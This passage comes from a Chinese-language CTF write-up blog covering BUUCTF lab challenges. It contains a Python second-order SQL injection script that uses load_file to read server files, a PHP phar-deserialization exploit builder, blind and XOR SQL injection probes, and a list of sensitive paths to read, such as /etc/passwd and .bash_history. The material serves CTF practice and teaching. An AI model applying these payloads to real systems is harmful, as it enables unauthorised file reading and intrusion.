class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://c75e34b6-4ada-4c6f-b471-6f05341fd7de.node4.buuoj.cn:81/&quot;</span></span><br><span class="line"></span><br><span class="line">write = url + <span class="string">&quot;write_do.php?do=write&quot;</span></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&quot;PHPSESSID&quot;</span>: <span class="string">&quot;8vv584b0t7so03n3ef2aej1e66&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">now_id = <span class="number">1</span></span><br><span class="line">payload = <span class="string">&quot;&#x27;,content=(select hex(load_file(&#x27;/var/www/html/flag_8946e1ff1ee3e40f.php&#x27;))),/*&quot;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&quot;title&quot;</span>: <span class="string">&quot;1&quot;</span>,</span><br><span class="line">    <span class="string">&quot;category&quot;</span>: payload,</span><br><span class="line">    <span class="string">&quot;content&quot;</span>: <span class="string">&quot;1&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(write, data=data1, cookies=cookie)</span><br><span class="line"></span><br><span class="line">comment = url + <span class="string">&quot;write_do.php?do=comment&quot;</span></span><br><span class="line">data2 = &#123;</span><br><span class="line">    <span class="string">&quot;content&quot;</span>: <span class="string">&quot;*/#&quot;</span>,</span><br><span class="line">    <span class="string">&quot;bo_id&quot;</span>: now_id + <span class="number">1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">res = requests.post(comment, data=data2, cookies=cookie)</span><br><span class="line"><span class="comment"># print(res.text)</span></span><br><span class="line">soup = BeautifulSoup(res.text, <span class="string">&#x27;lxml&#x27;</span>)  <span class="comment"># lxml HTML解析器</span></span><br><span class="line"><span class="comment"># print(soup.select(&#x27;.col-sm-5&#x27;))#选择标签带有这个类名的</span></span><br><span class="line">con = re.findall(<span class="string">&#x27;&lt;div class=&quot;col-sm-5&quot;&gt;&lt;p&gt;(.*?)&lt;/p&gt;&lt;/div&gt;&#x27;</span>, res.text, re.S | re.M)  <span class="comment"># find_all():可以根据标签名、属性、内容查找文档</span></span><br><span class="line"><span class="comment"># print(con)</span></span><br><span class="line"><span class="built_in">print</span>(con[<span class="number">0</span>])</span><br><span class="line"><span class="built_in">print</span>(now_id)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytearray</span>.fromhex(con[<span class="number">0</span>]))  <span class="comment"># 16进制转文本</span></span><br></pre></td></tr></table></figure><h3 id="思考与收获"><a href="#思考与收获" class="headerlink" title="思考与收获"></a>思考与收获</h3><p>过滤表，等操作可能就是不让你往那个方向走，引导你去另外的读取文件之类的操作。下次做数据库可以先看看版本，用户。</p><p>比较困难的题目，要试一试看看有没有源码泄露。</p><p>可以有多处一起拼接SQL语句，能拼就好。</p><p>读取文件，常用的敏感信息。</p><p>&#x2F;etc&#x2F;passwd <a href="https://blog.csdn.net/stone_fall/article/details/109078160">https://blog.csdn.net/stone_fall/article/details/109078160</a> 本题我们看到读取后最下面有个www用户，而且目录是&#x2F;home&#x2F;www</p><p>文件太大显示不出来，可以用hex函数。</p><p>还有其他一些爬虫的知识，选择标签，转换16进制，正则。</p><h3 id="知识"><a href="#知识" class="headerlink" title="知识"></a>知识</h3><p><strong>select load_file(‘文件绝对路径’)</strong></p><blockquote><p>load_file(‘文件绝对路径’)读取文件并返回文件内容为字符串。使用此函数，该文件必须位于服务器主机上，必须指定完整路径的文件，必须有FILE权限。<br>一般用法步骤：</p><p>读&#x2F;etc&#x2F;init.d下的东西，这里有配置文件路径<br>?id&#x3D;1’ union select 1,2,load_file(‘&#x2F;etc&#x2F;init.d&#x2F;httpd’)<br>得到web安装路径<br>?id&#x3D;1’ union select 1,2,load_file(‘&#x2F;etc&#x2F;apache&#x2F;conf&#x2F;httpd.conf’)<br>读取密码文件<br>?id&#x3D;1’ union select 1,2,load_file(‘var&#x2F;www&#x2F;html&#x2F;xxx.com&#x2F;php&#x2F;conn.inc.php’)</p></blockquote><p>.<strong>bash_history</strong></p><p>在etc&#x2F;passwd下可以知道www用户（一般和网站操作相关的用户，由中间件创建）的目录是&#x2F;home&#x2F;www，可以查询这下面的.bash_history</p><blockquote><p>每个在系统中拥有账号的用户在他的目录下都有一个“.bash_history”文件，保存了当前用户使用过的历史命令，方便查找。</p></blockquote><p>.<strong>DS_Store</strong></p><blockquote><p>.DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，目的在于存贮目录的自定义属性，例如文件们的图标位置或者是背景色的选择。通过.DS_Store可以知道这个目录里面所有文件的清单。</p></blockquote><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://fanygit.github.io/2021/08/17/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment%201/">https://fanygit.github.io/2021/08/17/[%E7%BD%91%E9%BC%8E%E6%9D%AF%202018]Comment%201/</a></p><p><a href="https://mochazz.github.io/2018/09/01/2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E5%9B%9B%E5%9C%BA/#comment">https://mochazz.github.io/2018/09/01/2018%E7%BD%91%E9%BC%8E%E6%9D%AF%E7%AC%AC%E5%9B%9B%E5%9C%BA/#comment</a></p><p><a href="https://blog.csdn.net/qq_45521281/article/details/105470232">https://blog.csdn.net/qq_45521281/article/details/105470232</a></p><p><a href="https://blog.csdn.net/zhangzejia/article/details/79658221">https://blog.csdn.net/zhangzejia/article/details/79658221</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
            <tag> sql </tag>
            
            <tag> 二次注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>[SWPUCTF 2018]SimplePHP</title>
      <link href="/2023/02/14/SWPUCTF-2018-SimplePHP/"/>
      <url>/2023/02/14/SWPUCTF-2018-SimplePHP/</url>
      
        <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>查看文件中url可以查看已有的PHP文件。</p><p>?file&#x3D;index.php</p><p>index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;base.php&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>upload_file.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">upload_file</span>(); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>function.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="comment">//show_source(__FILE__); </span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;base.php&quot;</span>; </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/html;charset=utf-8&quot;</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>); </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_do</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>].<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]).<span class="string">&quot;.jpg&quot;</span>; </span><br><span class="line">    <span class="comment">//mkdir(&quot;upload&quot;,0777); </span></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>)) &#123; </span><br><span class="line">        <span class="title function_ invoke__">unlink</span>(<span class="variable">$filename</span>); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],<span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>); </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;上传成功!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">upload_file_check</span>()) &#123; </span><br><span class="line">        <span class="title function_ invoke__">upload_file_do</span>(); </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload_file_check</span>(<span class="params"></span>) </span>&#123; </span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$_FILES</span>; </span><br><span class="line">    <span class="variable">$allowed_types</span> = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>,<span class="string">&quot;jpeg&quot;</span>,<span class="string">&quot;jpg&quot;</span>,<span class="string">&quot;png&quot;</span>); </span><br><span class="line">    <span class="variable">$temp</span> = <span class="title function_ invoke__">explode</span>(<span class="string">&quot;.&quot;</span>,<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]); <span class="comment">//分割上传的文件名，保存为temp数组</span></span><br><span class="line">    <span class="variable">$extension</span> = <span class="title function_ invoke__">end</span>(<span class="variable">$temp</span>); <span class="comment">//取数组最后一个，即扩展名</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$extension</span>)) &#123; </span><br><span class="line">        <span class="comment">//echo &quot;&lt;h4&gt;请选择上传的文件:&quot; . &quot;&lt;h4/&gt;&quot;; </span></span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123; </span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">in_array</span>(<span class="variable">$extension</span>,<span class="variable">$allowed_types</span>)) &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>; </span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">else</span> &#123; </span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;script type=&quot;text/javascript&quot;&gt;alert(&quot;Invalid file!&quot;);&lt;/script&gt;&#x27;</span>; </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>; </span><br><span class="line">        &#125; </span><br><span class="line">    &#125; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>base.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>   <span class="title function_ invoke__">session_start</span>(); <span class="meta">?&gt;</span> &lt;!--flag is in f1ag.php--&gt;</span><br></pre></td></tr></table></figure><p>file.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;content-type:text/html;charset=utf-8&quot;</span>);  </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;function.php&#x27;</span>; </span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;class.php&#x27;</span>; </span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/var/www/html/&#x27;</span>); </span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&quot;file&quot;</span>] ? <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>] : <span class="string">&quot;&quot;</span>; </span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;There is no file to show!&lt;h2/&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(); </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="variable">$show</span>-&gt;source = <span class="variable">$file</span>; </span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>class.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C1e4r</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;str = <span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;test = <span class="variable language_">$this</span>-&gt;str;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$file</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="variable">$file</span>;   <span class="comment">//$this-&gt;source = phar://phar.jpg</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$content</span> = <span class="variable language_">$this</span>-&gt;str[<span class="string">&#x27;str&#x27;</span>]-&gt;source;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="variable">$key</span> = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">_show</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/http|https|file:|gopher|dict|\.\.|f1ag/i&#x27;</span>,<span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;hacker!&#x27;</span>);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="title function_ invoke__">highlight_file</span>(<span class="variable">$this</span>-&gt;source);</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/http|https|file:|gopher|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker~&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$file</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$params</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;params = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$key</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>])) &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="variable language_">$this</span>-&gt;params[<span class="variable">$key</span>];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$value</span> = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">file_get</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file_get</span>(<span class="params"><span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$text</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$value</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$text</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>上传文件，然后再上传一遍已经存在的，会触发unlink。phar序列化。</p><p>在file.php中有file_exists也可以触发phar反序列化</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$show</span> = <span class="keyword">new</span> <span class="title class_">Show</span>(); </span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">file_exists</span>(<span class="variable">$file</span>)) &#123; </span><br><span class="line">    <span class="variable">$show</span>-&gt;source = <span class="variable">$file</span>; </span><br><span class="line">    <span class="variable">$show</span>-&gt;<span class="title function_ invoke__">_show</span>(); </span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$file</span>))&#123; </span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;file doesn\&#x27;t exists.&#x27;</span>); </span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>file.php?file&#x3D;523006f8c4f9d1b0b5af760030a87898.jpg</p><p>exp</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$source</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$str</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line"><span class="comment">//        $this-&gt;source = $file;</span></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;phar://phar.jpg&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title class_">Show</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;exp.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure><p>?file&#x3D;phar:&#x2F;&#x2F;upload&#x2F;41859a99918a3db4fc9260fa72e4dd1d.jpg</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GIF89a&lt;?php __HALT_COMPILER(); ?&gt;  </span><br></pre></td></tr></table></figure><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://mayi077.gitee.io/2020/11/15/SWPUCTF-2018-SimplePHP/">https://mayi077.gitee.io/2020/11/15/SWPUCTF-2018-SimplePHP/</a></p><p><a href="https://blog.csdn.net/qq_51584770/article/details/121218448">https://blog.csdn.net/qq_51584770/article/details/121218448</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> buu </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GYCTF2020]Ezsqli</title>
      <link href="/2023/02/14/GYCTF2020-Ezsqli/"/>
      <url>/2023/02/14/GYCTF2020-Ezsqli/</url>
      
        <content type="html"><![CDATA[<h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>有输入框，依次输入1,2发现回显，3的时候无回显。随便fuzz一下</p><p>过滤了or,information,union,and估计是要盲注</p><p>尝试一下异或注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0^(length(database())&gt;10)</span><br></pre></td></tr></table></figure><p>测试 if 也可以</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">id=if(length(database())=21,1,0)</span><br><span class="line">if(ascii(substr(database(),&#123;&#125;,1))&gt;&#123;&#125;,1,0)</span><br><span class="line">if(database()=0x676976655f6772616e6470615f70615f70615f7061,1,0)</span><br></pre></td></tr></table></figure><p>过滤了information表，采用替换表</p><p>sys.schema_table_statistics_with_buffer，sys.x$schema_flattened_keys </p><p>则查库查表都一样，但是这几个表中没有储存列名。所以得用无列名注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">数据库give_grandpa_pa_pa_pa</span><br><span class="line">表名f1ag_1s_h3r3_hhhhh,users233333333333333</span><br></pre></td></tr></table></figure><h4 id="无列名注入"><a href="#无列名注入" class="headerlink" title="无列名注入"></a>无列名注入</h4><p>数据库select (select ‘b’)&gt;(select ‘abcd’);</p><p>返回1，即只会比较首字母，这样的话我们可以逐位进行比较。遇到相等则让我们比较的字符串增加该字母，一直这样匹配出flag。（ASCII偏移）</p><p>测试列数</p><figure class="highlight sql"><table><tr><td 